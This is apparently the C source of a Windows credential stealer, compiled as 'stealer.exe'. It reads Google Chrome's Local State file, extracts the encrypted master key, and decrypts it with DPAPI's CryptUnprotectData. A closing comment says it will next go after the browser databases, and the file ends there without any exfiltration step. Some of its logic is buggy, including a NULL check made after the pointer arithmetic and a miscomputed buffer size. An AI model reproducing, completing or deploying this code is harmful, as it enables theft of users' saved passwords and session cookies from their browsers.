#include <windows.h>
#include <shlwapi.h>
#include <Shlobj.h>
#include <dpapi.h>
#include <stdio.h>
//Google Chrome records Web storage data in a SQLite file in the user's profile. 
//The subfolder containing this file is 
//C:\Users\<User>\AppData\Local\Google\Chrome\User Data\Local State on Windows
#define BUFSIZE 1024
//gcc .\Stealer.c -lShlwapi -o stealer.exe

int main(int argc, char const *argv[]){
  //get to the right directory
  TCHAR pszAppdata[MAX_PATH];
  if(!SUCCEEDED(SHGetFolderPathA(
    NULL,
    CSIDL_LOCAL_APPDATA,
    NULL,
    0,
    pszAppdata
  ))){
    printf("[!] Error getting appdata path: %d\n", GetLastError());
    return 1;
  };
  char* filePath = "Google\\Chrome\\User Data\\Local State\0";
  TCHAR pszFile[MAX_PATH];
  if(!PathCombineA(
    pszFile, 
    pszAppdata, 
    filePath)){
    printf("[!] Error combining path: %d\n", GetLastError());
    return 1;
  }
  HANDLE hFile = CreateFileA(
    pszFile,
    GENERIC_READ,
    0,
    NULL,
    3,
    FILE_ATTRIBUTE_NORMAL,
    NULL
  );
  DWORD fileSize = GetFileSize(
    hFile, 
    NULL
  );
  if(fileSize == INVALID_FILE_SIZE){
    printf("[!] Error getting file size: %d\n", GetLastError());
    return 1;
  }
  char* fileBuffer = (char*) malloc(sizeof(char) * (fileSize + 1));
  DWORD bytesRead = 0;
  if(!ReadFile(
    hFile, 
    fileBuffer, 
    fileSize, 
    &bytesRead, 
    NULL)){
      printf("[!] Error reading file: %d\n", GetLastError());
      return 1;
  }
  //parse the encrypted key from the file
  char* found = (strstr(fileBuffer, "\"encrypted_key\"")) + 17;
  if(found == NULL){
    printf("[!] key not found... exiting...");
    return 1;
  }
  DWORD end = 0;
  for(DWORD i = 0; i < 500; i++){
    if(*(found + i) == '}'){
      end = i - 1;
      break;
    }
  }
  if(end == 0){
    printf("[!] key end not found... exiting...");
    return 1;
  }
  //copy key into buffer
  char* encryptedKey = (char*) malloc(sizeof(char) * (*(found) - end) + 1);
  strncpy(encryptedKey, found, end);
  encryptedKey[strlen(encryptedKey)] = '\0';
  //decode key from base64
  DWORD pbSize = 0;
  CryptStringToBinaryA(
    encryptedKey,
    0,
    CRYPT_STRING_BASE64,
    NULL,
    &pbSize,
    NULL,
    NULL
  );
  BYTE* decodedKey = malloc(sizeof(BYTE) * pbSize);
  CryptStringToBinaryA(
    encryptedKey,
    0,
    CRYPT_STRING_BASE64,
    decodedKey,
    &pbSize,
    NULL,
    NULL
  );
  memset(decodedKey, 0, 5);
  decodedKey += 5;
  //decrypt the key
  DATA_BLOB encData;
  DATA_BLOB entropy;
  DATA_BLOB decData;
  encData.cbData = pbSize - 5;
  encData.pbData = decodedKey;
  entropy.cbData = 0;
  entropy.pbData = NULL;
  if(!CryptUnprotectData(
    &encData,
    NULL,
    &entropy,
    NULL,
    NULL,
    0,
    &decData
  )){
    printf("[!] Error unprotecting data: %d\n", GetLastError());
    return 1;
  };
  //WE NOW HAVE THE KEY IN decData.pbData! now lets get our databases..
  
  return 0;
}
